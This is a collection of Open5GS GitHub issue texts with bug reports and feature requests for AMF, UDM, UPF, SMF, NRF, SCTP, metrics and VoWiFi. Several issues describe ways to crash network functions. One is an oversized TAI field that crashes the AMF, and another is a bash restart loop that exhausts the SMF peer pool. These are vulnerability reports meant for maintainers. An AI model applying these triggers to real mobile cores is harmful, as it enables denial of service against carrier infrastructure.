items.body: ### Open5GS Release, Revision, or Tag v2.7.6 ### Steps to reproduce ### **Bug: AMF Fails to Re-establish H2 Connection After UDM GOAWAY** --- ### **Description** The AMF doesn't properly handle a `GOAWAY` frame from the UDM (external). Instead of creating a new HTTP/2 connection as expected, the AMF attempts to reuse the existing, now-terminated TCP stream, causing subsequent requests to fail. ### **Reproduction Steps** 1. **Configure HTTP2 Server:** Set up an HTTP/2 server with the request timeout configured to a minimal value (e.g., 1 second). This server will act as the UDM. 2. **AMF Discovery:** Allow the AMF to discover and connect to the configured HTTP/2 server (UDM). 3. **UE Registration:** Initiate the registration process for a large number of UEs (e.g., 1000 UEs). The registration requests will be sent from the AMF to the UDM. ### **Observed PCAP** After the http2 connection is timed out and UDM sends Goaway to AMF to close the connection, AMF uses the same tcp stream for subsequent http2 requests ### Logs ```shell ``` ### Expected behaviour Upon receiving a `GOAWAY` frame from the UDM, the AMF should recognize that the current HTTP/2 connection is being shut down. It should then gracefully close the existing TCP stream and initiate a new TCP stream to establish a fresh HTTP/2 connection with the UDM for all subsequent requests. ### Observed Behaviour After the UDM sends a `GOAWAY` frame, the AMF continues to use the same TCP stream that was reset. This results in the AMF failing to send further requests to the UDM. ### eNodeB/gNodeB _No response_ ### UE Models and versions _No response_

items.body:
# Memory leak in UDM context with SUCI-only attachments causing “No memory pool” error

**Environment:**

- **Open5GS version:** v2.7.5
- **Components affected:** UDM
- **Test profile:** SUCI-only (profile A)
- **Max UE config:** 1000

## Description

When performing continuous UE attachment attempts using a SUCI-only profile without registering the IMSI in the subscriber database, UDM’s memory pool is not being released correctly after an Registration Reject. After roughly 1000 attempts (matching the configured UE limit), UDM logs:

```text
udm/context.c line 158 ogs_error("No memory pool [%s]", suci);
```

This indicates exhaustion of the underlying memory pool and suggests a leak in the UDM context-handling path. Initial checks confirm that UDR does **not** exhibit the same behavior.

## Steps to Reproduce

1. Configure Open5GS with UDM and UDR, max UE = 1000.
2. Use a SUCI-only test UE profile (profile A).
3. Perform continuous Registration attempts:
   - Allow the first few to succeed (simulating known UEs).
   - Continue registering with unknown SUCIs until an Registration Reject occurs.
4. Observe UDM logs and check memory pool usage.

## Observed Behavior

- UDM logs repeated failures:
  ```text
  WARNING: [suci-…] HTTP response error [404] (../src/udm/nudr-handler.c:87)
  ERROR: udm/context.c:158: No memory pool [<suci>]
  ```
- After \~1000 unknown SUCI attempts, the UDM memory pool is exhausted.

## Expected Behavior

- Memory allocated for each Registration attempt should be properly freed after:
  - Successful registration
  - Registration reject (NAS context release)
- No “No memory pool” errors under normal continuous testing.

## Logs

- **Error snippet from UDM:**
  ```
  04/18 22:14:12.642 WARNING: … HTTP response error [404] (nudr-handler.c:87)
  udm/context.c line 158 ogs_error("No memory pool [%s]", suci);
  ```

items.body:
### Open5GS Release, Revision, or Tag

v2.7.3

### Steps to reproduce

1. Process 1: Abnormal handover required

- (1)	Deploy two GNBS, each configured with a different IP address, and use different imsi to connect two different terminals.

- (2)	There is an executable but incomplete handover required message

- (3)	After (2), release the original gnb-ue context

[Problematic handover required process.zip](https://github.com/user-attachments/files/20362243/Problematic.handover.required.process.zip)

2. Process 2: Loop the registration request and de-registration request processes

- (1)	Configure a new UE (IMSI matching one from Step 1) to connect via a third gNB.

- (2)	In this process, after the registration request is executed, the deregistration request is executed immediately and continues in a loop.

[only Registration request and the De-registration request loop process.zip](https://github.com/user-attachments/files/20362250/only.Registration.request.and.the.De-registration.request.loop.process.zip)

First, perform Process 1, which will trigger the incomplete switching of the two gNBS requirements and create two additional gNB-UE contexts. Then before the release of the first two gNBS, start to repeat Process 2 multiple times. Observe the crash of AMF until the connection refused of Process 1 and the gNB of Process 1 is released.

We suspect that there is a conflict between the imsi of Process One and Process two. Therefore, when process Two is executed, the gnb in Process One is released, resulting in the release of the context of Process Two as well. Thus, the problem of not being able to find the ran_ue value occurs.

### Logs

### Open5GS Release, Revision, or Tag

### Steps to reproduce

- Configure a new UE (IMSI matching one from Step 1) to connect via a third gNB.

- The third UE repeatedly executes the processes such as initial registration, authentication, PDU session establishment, release, etc.

Then before the release of the first two gNBS, start to repeat Process two multiple times. Observe the crash of AMF until the gNB of Process one is released.

We suspect that there is a conflict between the imsi of Process One and Process two. Therefore, when process Two is executed, the gnb in Process One is released, resulting in the release of the context of Process Two as well. Thus, the problem of not being able to find the ran_ue value occurs.

items.title: [Bug]: AMF crash on SCTP partial messages: assertion failure due to missing MSG_EOR flag in fragment processing

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.7.3

### Steps to reproduce

Increase the _TAI_ field length in the _ngap uplinkNASTransport/nas Registration_complete_ message to around 1,000,000, generating an unusually long _userLocationInformation_ to be sent to the open5gs.


[AMF Crash Caused by Length-Induced SCTP Handling Error.zip](https://github.com/user-attachments/files/19933186/AMF.Crash.Caused.by.Length-Induced.SCTP.Handling.Error.zip)


We suspect that the issue stems from improper handling of oversized SCTP messages in the AMF's NGAP message processing logic. Specifically, when receiving abnormally large Registration Request messages (particularly with manipulated TAI length fields), the SCTP layer fragments the data into multiple chunks. However, the AMF fails to properly:

- Cache and reassemble intermediate fragments before processing the complete message.

- Handle the absence of MSG_EOR flags in non-final fragments, incorrectly treating them as errors.

- Validate fragment boundaries, leading to assertion failures when receiving partial messages with errno=0.

This results in an AMF crash when processing fuzzed TAI values (e.g., 826518 bytes), as the code neither anticipates legitimate multi-fragment transmissions nor recovers from incomplete reassembly. 

### Logs


items.title: [Issue]:  UPF PFCP support for SMF with multiple IP addresses

labels.name: type:enhancement
labels.description: Enhance performance or improve usability of original features.

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v.2.7.1

### Steps to reproduce

Since Release 16 there are features in the standard to support SMF with multiple IP addresses (more cloud compatible) like SSET or MPAS.  But even without those features the PFCP standard supports that both SMF and UPF have multiple IP addresses (see section 5.8.1 in TS 29244 "Only one PFCP association shall be setup between a given pair of CP and UP functions, even if the CP and/or UP function exposes multiple IP addresses. ") 

It is open to interpretation how to handle the situation in which a CP Function has several IP addresses. SSET and MPAS resolve that interpretation but without support for them there is room for a flexible interpretation that would provide some support for SMF with multiple IP addresses.

The Open5GS UPF right now does not support SMF with multiple IP addresses of any kind.  Even if the SMF in the Association Setup announces all its IP address in the Alternative SMF IP Address IE  (which the standard doesn't require) the Open5GS UPF will not accept a PFCP message other than a HeartBeat Request or an Association Setup Request unless it comes exactly from the same IP address from which  a previous Association Setup Request has happened. Even worse, the Open5GS UPF does not reply to the message providing any error, triggering that the CP retransmits the message until it considers the UPF problematic and sets it down.

I think its the call to xact functions that is causing the situation, that checks the source IP address matches the same source IP address of the association, probably when calling ogs_pfcp_xact_receive.

### Logs

_No response_

### Expected behaviour

If the PFCP Association Setup includes Node ID with an FQDN , independent whether it includes the Alternative SMF IP address or not, the UPF should behave as follows 
- In a PFCP Session Establishment Request if the Node ID is included with the same FQDN, that message has to be considered as coming from the associated SMF and processed accordingly independently of the Source IP address.  The F-SEID IE would include the IP address where the UPF sends Reports or other messages associated with that session
- In a PFCP Session Modification if the SEID matches the SEID allocated by the UPF, then it has to be accepted independent of the source IP address (there is no place in the standard that requires that). If the CP function has changed the IP address where it wants to receive reports for that session it can add the CP F-SEID IE into the message
- in a PFCP Session Deletion message, if the SEID matches the SEID allocated by the UPF, the UPF should accept it independent of the source IP address where it comes from.

I understand these behaviors for PFCP Session Modification or PFCP Session Deletion are rather unsecure, and I prefer that the UPF makes some check. If it were possible at least the UPF should reply with an error to those messages if its checking the source IP address and it didn't like it.  What I would suggest is that if the SMF has indicated during association an Alternative SMF IP Address the Open5GS  would accept messages from any of those IP addresses (the source IP address of the association or any of the Alternative ones). I would do the changes myself but the code is not commented enough for me to understand what's doing and I don't really understand the role of those xact functions and structures which seem to be the problematic ones.

### Observed Behaviour

Actually the UPF **does not reply at all** to a PFCP Session Establishment or Modification or Deletion when it doesn't come from the same IP address of the Association Setup even if the Node ID matches the one in the PFCP Association Setup Request which was accepted.

At a minimum I would find sensible that the Open5GS UPF  does reply with an error Response with Cause 72  which is "No Established PFCP Association"  the standard says "This cause shall be used by the CP function or the UP function if they receive a PFCP message other than the PFCP Association Setup Request and the Heartbeat Request message from a peer with which there is no established PFCP Association."

### eNodeB/gNodeB

_No response_

### UE Models and versions

_No response_

items.title: [Bug]: Open5GS Memory issues related to cJSON

labels.name: triage
labels.description: Triage label for new issues and feature requests

items.body:
### Open5GS Release, Revision, or Tag

v2.7.1

### Steps to reproduce

The memory created by malloc() is released by  _talloc_free().

In /lib/sbi/message.c funtions like ogs_sbi_discovery_option_build_snssais(), ogs_sbi_discovery_option_build_guami(), ogs_sbi_discovery_option_build_tai(), ogs_sbi_discovery_option_build_plmn_list() return a string object which is created by cJSON_PrintBuffered(), which using malloc() to create memory space. But these strings are released by ogs_free(), which using  _talloc_free() to free memory space.

I'm not sure if _talloc_free() can free the memory that created by malloc().

However, I think that this matching of create and free operations is incorrect and may lead to memory leak issues.

### Logs

```shell
no response
```


### Expected behaviour

In /lib/sbi/openai/external/cJSON.c, function cJSON_Print() and cJSON_PrintBuffered() use internal_malloc() , which uses **malloc()** to create new memory space. 

Therefore, when using  cJSON_Print() or JSON_PrintBuffered() to create char* strings from JSON object, it should use **cJSON_free()** to free these strings. 

### Observed Behaviour

The functions that use  cJSON_Print() or JSON_PrintBuffered() are now using ogs_free() to clear the string memory. For example,  ogs_sbi_build_request();

ogs_free() is using ogs_talloc_free()
```c
ogs_talloc_free(void *ptr, const char *location)
{
    int ret;

    ogs_thread_mutex_lock(&mutex);

    ret = _talloc_free(ptr, location);

    ogs_thread_mutex_unlock(&mutex);

    return ret;
}
```

### Steps to reproduce

ogs_sctp_client() API doesn't allow passing in a list of local IP addresses to bind to before issuing the connect.

As a result, linux announces the whole set of IP addresses available in the host, which will in general create unnecessary complexity and annoying signalling, and even on some setups prevent correct operation (see https://osmocom.org/issues/6509).

ogs_sctp_client() should at least support assigning one local IP address through bind(), and even better, multiple IP addresses through sctp_bindx(). (Same goes for connect to multiple IP addresses through sctp_connectx, but out of the scope for this ticket).

`rc = sctp_bindx(sfd, (struct sockaddr *)addrs_buf, local_hosts_cnt, SCTP_BINDX_ADD_ADDR);`

Some ideas can be taken from existing osmocom code (grep for "multiaddr" and "sctp" keywords/APIs):
https://gitea.osmocom.org/osmocom/libosmocore/src/branch/master/include/osmocom/core/socket.h
https://gitea.osmocom.org/osmocom/libosmocore/src/branch/master/src/core/socket.c (specially osmo_sock_init2_multiaddr2()).
https://gitea.osmocom.org/osmocom/libosmo-netif/src/branch/master/include/osmocom/netif/stream.h
https://gitea.osmocom.org/osmocom/libosmo-netif/src/branch/master/include/osmocom/netif/sctp.h
https://gitea.osmocom.org/osmocom/libosmo-netif/src/branch/master/src/stream.c
https://gitea.osmocom.org/osmocom/libosmo-netif/src/branch/master/src/stream_cli.c
https://gitea.osmocom.org/osmocom/libosmo-netif/src/branch/master/src/sctp.c

Then, users of the ogs_sctp_client(), like sgsap_client(), should be able to get the local addresses from config files, eg. in a new "sgsap"=>"server"=>"local_addresses" list field.

### Logs

_No response_

### Expected behaviour

Being able to set local addresses on SCTP client sockets.

### Observed Behaviour

Unable to set local addresses on SCTP client sockets.

### eNodeB/gNodeB

_No response_

### UE Models and versions

_No response_

items.body:
### Open5GS Release, Revision, or Tag

v2.7.0

### Steps to reproduce

Please set up the environment following the instructions at [https://github.com/s5uishida/open5gs_5gc_ueransim_sample_config](https://github.com/open5gs/open5gs/issues/url), we use just one UE and one UPF.
Our fuzzing tool found a possible bug when testing UE attachment process.
Just continuously run this script until SMF crashes.
```shell
#!/bin/bash
./open5gs/install/bin/open5gs-amfd &
ssh user@xxx.xxx.xxx.xxx /UERANSIM/build/runGnb.sh &
ssh user@xxx.xxx.xxx.xxx /UERANSIM/build/runUE.sh &
sleep 1.5
pkill open5gs-amfd
ssh user@xxx.xxx.xxx.xxx pkill nr-gnb
ssh user@xxx.xxx.xxx.xxx pkill nr-ue
``` 
This script means opening AMF and gNB, and initiating UE attach process when all other network elements are already up. It then terminates AMF, gNB, and UE before the UE attach process is completed.
[smf.log](https://github.com/open5gs/open5gs/files/14801892/smf.log)

```shell
./install/bin/open5gs-smfd(+0x26345) [0x55d9f6995345]
/home/lxy/Desktop/open5gs/install/lib/x86_64-linux-gnu/libogscore.so.2(ogs_fsm_dispatch+0x113) [0x7fb613cc9402]
./install/bin/open5gs-smfd(+0x103b3) [0x55d9f697f3b3]

```


### Expected behaviour

After reviewing the source code, we found that the reason for SMF crashing is likely due to the failure to allocate an nf_instance from the nf_instance_pool during the ogs_sbi_nf_instance_add function. The allocated nf_instance is not released when an error occurs. Theoretically, running the above script 64 times will lead to SMF crashing. However, due to latency, not every run will necessarily result in nf_instance not being released. Therefore, please continue running it multiple times.

This could be a feature of Open5gs, where the number of peers is limited to 64. However, when unexpected events occur, releasing unused resources may be a better approach.

### Observed Behaviour

SMF crashed due to failing to add nf_instance.

### eNodeB/gNodeB

UERANSIM v3.2.6

### UE Models and versions

UERANSIM v3.2.6

items.body:
Analysis done on git hash: 98285096680f5e368f8fb6fd45f168037bf8ce3b

Reference attachment with the details of valgrind memcheck analysis: 
[valgrind.zip](https://github.com/user-attachments/files/16420828/valgrind.zip)

The valgrind memcheck procedure used for this analysis is within procedure/README*.txt of the attachment.  Note that this is a slightly different set of valgrind memcheck suppressions than found in misc/valgrind of the open5gs git repo.

The proposal out of the valgrind memcheck procedure are a couple of small patches to open5gs and freeDiameter within the patches subdirectory.  It is these two patches which are recommended for application.

For reference only (for explanation of each change) there is also a patch with comments added to explain each change.  That reference only patch is within the patches/reference_only directory of the attachment.  That references patch is not intended to be applied but is just there for explanation of each change.  However, if you like the comments in that patch you can optionally do so.

Although all of the changes in the patches directory are recommended you could optionally pick up the primary fixes.  The primary fixes are these:
   1) lib/crypt/zuc.c  (open5gs)
   2) extensions/dbg_msg_dumps/dbg_msg_dumps.c (freeDiameter)
   3) libfdproto/dictionary.c (freeDiameter)

The other fixes are in the test area and are recommended but optional.

There are 2 valgrind suppressions recommended in the procedure/*.supp file. Note that these 2 suppressions are fewer suppressions than what the misc/valgrind directory recommends.  It is optional as to whether open5gs wants to use fewer suppresions but it is recommended to use fewer suppressions.  Minimizing the number of valgrind suppressions will allow more leaks to be caught by exercising valgrind.

items.title: open5gs-upfd: Support tun configuration under linux

labels.name: type:enhancement
labels.description: Enhance performance or improve usability of original features.

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: status:needs-planning
labels.description: Issue accepted and needs planning into milestones

items.body:
Right now, on Linux, open5gs-upfd relies on the tunnel device be created in a persistent way and be pre-configured (address assigned, iface up) before the upfd process starts.

It would be fairly easy, however, to also support configuring it on the fly in the event the tun device is not yet pre-configured. Most of the pieces and logic are already there.

This way a user wouldn't need to fight against tun creation and management outside of open5gs.

The easy way to do it, would be to change ogs_tun_set_ip() in linux-setup.c to:
* Check if the tunnel iface created contains the flag "IFF_PERSIST" in ifr->ifr_flags by means of ioctl(TUNGETIFF).
* If IFF_PERSIST is set, the tunnel was pre-configured outside of open5gs and hence no further config needs to be applied, as per current existing way.
* If IFF_PERSIST is not set, create and configuring it:
** use ogs_tun_set_ip() param "gw" and/or "sub" to set iface and/or destination address by means of ioctl() SIOCSIFADDR and SIOCSIFDSTADDR
** bring the iface up with ioctl() SIOCSIFFLAGS (IFF_UP | IFF_RUNNING)

* Optional: Allow launching a script as a child of open5gs-upfd for each tun during startup to allow user to set up further config.

Example on related code in osmo-ggsn, which allows both scenarios presented above (reusing existing persistent tun or creating and configuring one):
https://git.osmocom.org/osmo-ggsn/tree/lib/tun.c
https://git.osmocom.org/osmo-ggsn/tree/lib/netdev.c

items.body:
### Open5GS Release, Revision, or Tag

v2.6.0

### Components and subsystems

PCF/SMF/UPF/UDM

### Proposed functionality

1. According to the 3GPP TS 23.503, TS 24.526, Release 16. The 5GCore should support URSP allocated to the UE by AMF & gNB.
   This feature will provide us with great help.

2. According to the 3GPP TS 23.501 Release 16. The 5GCore should support Ethernet type PDU session for the 5G LAN type service.
3. We would like to test the **URSP procedure** and **Ethernet type PDU session** with Open5GS and Amarisoft Callbox for more bussiness scenario. Meanwhile, the chipset manufacturer has been released some chipset to support the two features, that includes SDX65 from Qualcomm and V16 from ASR. 

So, we need the two features to test further more, and it would have a significant impact on 5G commercial applications.

### External dependencies

No external dependencies found yet.

### Open5GS Release, Revision, or Tag

v2.6.6

### Steps to reproduce

Using the kube-prometheus-stack I set up Open5GS and enabled metrics. There are many metrics that are referenced in the code, but are not accessible through Prometheus/Grafana - they are not exposed by NFs.
For example: 
For PCF, Number of AM policy association requests is named fivegs_pcffunction_pa_policyamassoreq, and is referenced in the code here (https://github.com/open5gs/open5gs/blob/main/src/pcf/metrics.c#L94C6-L94C43). 
Full list of metrics that are referenced in the code, but not exposed by NFS:

AMF:
fivegs_amffunction_rm_reginitfail
fivegs_amffunction_rm_regmobfail
fivegs_amffunction_rm_regperiodfail
fivegs_amffunction_rm_regemergfail

SMF:
gtp_node_gn_rx_parse_failed
gtp_node_gn_rx_createpdpcontextreq
gtp_node_gn_rx_deletepdpcontextreq
gtp_node_s5c_rx_parse_failed
gtp_node_s5c_rx_createsession
gtp_node_s5c_rx_deletesession
fivegs_smffunction_sm_sessionnbr
fivegs_smffunction_sm_qos_flow_nbr
fivegs_smffunction_sm_n4sessionestabfail

UPF:
fivegs_ep_n3_gtp_indatavolumeqosleveln3upf
fivegs_ep_n3_gtp_outdatavolumeqosleveln3upf
fivegs_upffunction_sm_n4sessionestabfail


Were these removed? Or never implemented?

### Logs

_No response_

### Expected behaviour

Metrics should be exposed by NFs to Prometheus to be scraped

### Observed Behaviour

Several metrics are not accessible, full list included in "Steps to reproduce"

not vital to the issue

not vital to the issue

### Open5GS Release, Revision, or Tag

v2.6.X

### Components and subsystems

NRF

### Proposed functionality

According to TS 29.510 V17.0.0 (section 5.2.2.2.2):
"The NRF shall allow the registration of a Network Function instance with any of the NF types described in clause 6.1.6.3.3, **and it shall also allow registration of Network Function instances with custom NF types (e.g., NF type values not defined by 3GPP, or NF type values not defined by this API version)**.

[...]

The NRF shall accept the registration of NF Instances containing Vendor-Specific attributes (see 3GPP TS 29.500 [4], clause 6.6.3), and therefore, it shall accept NF Profiles containing attributes whose type may be unknown to the NRF, and those attributes shall be stored as part of the NF's profile data in NRF."

As of now, only nfTypes in cause 6.1.6.3.3 are supported, all other types are rejected. The NRF should allow custom nfTypes as well.

I am creating a tool that utilizes a custom Network Function with a modified version of Open5gs. Registering this custom NF crashes the NRF. I thought this was a bug in my (modified) forked version. ### Open5GS Release, Revision, or Tag

v2.6.4

### Components and subsystems

AAA, ePDG, HSS, SMF

### Proposed functionality

Hello,

My name is Amr. I am a developer interested in and willing to help with this feature. VoWiFi is a technology that enables voice, video, and SMS services over Wi-Fi networks using IMS as the core network. It provides seamless mobility and service continuity between LTE and Wi-Fi, as well as enhanced user experience and network efficiency.

I have been following the Open5GS project for a while and I am impressed by its features and performance. I think VoWiFi would be a great addition to Open5GS as it would allow users to make calls in areas with poor or no cellular coverage, improve call quality and reliability, and reduce the network load by offloading traffic to Wi-Fi networks. It would also offer the same level of security and functionality as VoLTE, such as SIM-based authentication, encryption, emergency calls, and conversational video over Wi-Fi (ViLTE).

You can follow [this tutorial](https://www.telecomtutorial.info/vowifi-series) for more details about this feature.

References:
- [3GPP TS 23.402](https://www.etsi.org/deliver/etsi_ts/123400_123499/123402/17.00.00_60/ts_123402v170000p.pdf)
  - Architecture enhancements for non-3GPP access
  - Covers Complete Architecture in Detail, a must-have Document for enhancing knowledge of VoWifi 
- [3GPP TS 33.402](https://www.etsi.org/deliver/etsi_ts/133400_133499/133402/17.00.00_60/ts_133402v170000p.pdf)
  - 3GPP System Architecture Evolution (SAE); Security aspects of non-3GPP accesses
  - Covers Security & Authentication related Call Flows
- [3GPP TS 29.273](https://www.etsi.org/deliver/etsi_ts/129200_129299/129273/17.06.00_60/ts_129273v170600p.pdf)
  - 3GPP EPS AAA interfaces
  - AAA Links, Descriptions, Format & Usage
- [3GPP TS 29.274](https://www.etsi.org/deliver/etsi_ts/129200_129299/129274/17.09.00_60/ts_129274v170900p.pdf)
  - S2b interface by the ePDG to the PGW 
- [RFC 7296](https://www.rfc-editor.org/rfc/rfc7296.html)
  - Internet Key Exchange Protocol Version 2 (IKEv2)
  - Basics of SWu Interface

Sincerely,
Amr Elsayyad

items.title: X2-based handover with Serving GW relocation

labels.name: type:enhancement
labels.description: Enhance performance or improve usability of original features.

labels.name: New Feature
labels.description: New features to implement

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
hi.
I am using my open5gs fork based on Release v2.3.6 in a real life enviroment with different network functions provided by different vendors.
I configured open5gs to play the S/P Gateway + PCRF roles and things work pretty well.
However, I am trying to test "X2-based handover with Serving GW relocation" and notice that the procedure fails.
Here (https://www.etsi.org/deliver/etsi_ts/123400_123499/123401/15.04.00_60/ts_123401v150400p.pdf),  the  5.5.1.1.3 section explains how "X2-based handover with Serving GW relocation" should work (page 240+).
From my tcpdump files, I can see that when SGWc receives a CreateSessionRequest from MME (in handover context) it does not send ModifyBearerRequest(s) to the PGW but instead it sends a CreateSessionRequest, which corresponds to a different state (not X2 handover, but rather initial attach).
By looking at the code it seems to me that "X2-based handover with Serving GW" is not addressed yet at all, so I started working to address this by myself. Not being used to work with such complex standard descriptions, things move pretty slow for me so I decided to open this Issue hoping I will find support to fix this.
I looked at the new releases and could not find anything related to my problem so I decided to stick with Release 2.3.6 for now.
If needed I can provide some pcap files (though I might have to anonimize some date in there).

Looking forward to hearing from you.
Thank you for this great project.

items.title: Metrics monitoring system

labels.name: New Feature
labels.description: New features to implement

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
Hi,

We require having some sort of system which can be used to export metrics to monitor the different open5gs programs.
For instance, we'd like to export the number of active PDP contexts / bearers at the SMF over time.

For that, we'd like to add support for counters into open5gs, adding some sort of generic API for counters, gauges, etc. As a backend/implementation for that API we are planning to use Prometheus [1], which basically requires an HTTP server to be running in the process providing the metrics (open5gs-*).
There already exists a prometheus client lib in C listed in the library list [2], prometheus-client-c [3], which actually contains 2 libraries: libprom and libpromhttp.
Libprom implements the formatting of the counters to be passed to prometheus, and libpromhttp is a really tiny library providing an http server which uses libmicrohpttd underneath. That's great because open5gs already depends on libmicrohttpd, and libmicrohttpd is so tiny that we can actually integrate all that part directly inopen5gs code.

There seems somebody already had the same idea of using libprom in open5gs in the past, so this already provides and insight of how it would look like (it may make more sense to have some generic ogs API wrapper in the middle though imho):
https://github.com/open5gs/open5gs/pull/530

So, I propose something like:

1. Adding some open5gs.git/lib/metrics/ containing a generic way to define counters and operate on them
2. Adding a open5gs.git/lib/metrics/void/ containing a void implementation (empty stubs doing nothing)
3. Adding a open5gs.git/lib/metrics/prometheus/ lib which can be conditionally enabled/disabled at build time, which depends on prometheus-client-c's libprom and libmicrohttpd.
4. Using the new lib in open5gs.git/src/smf/ with a few counters to start with.

[1] https://prometheus.io/
[2] https://prometheus.io/docs/instrumenting/clientlibs/
[3] https://github.com/digitalocean/prometheus-client-c

items.title: Number of UEs supported by PCRF
items.body:
Hello All,

I would like to ask whether there is any limit on number of UEs handled by PCRF? As per the example configuration file max UEs is set to 128, is it possible to support 100000 UEs? If so, could you please let me know what modifications do I need to set in configuration files to support such high number of UEs (memory pool configuration etc..)

Also, what is the max number of eNBs supported in the configuration file?

![image](https://user-images.githubusercontent.com/4115839/90616980-6b8c5580-e20e-11ea-8f37-c6a935530554.png)

Thanks a lot

Regards,
Supreeth
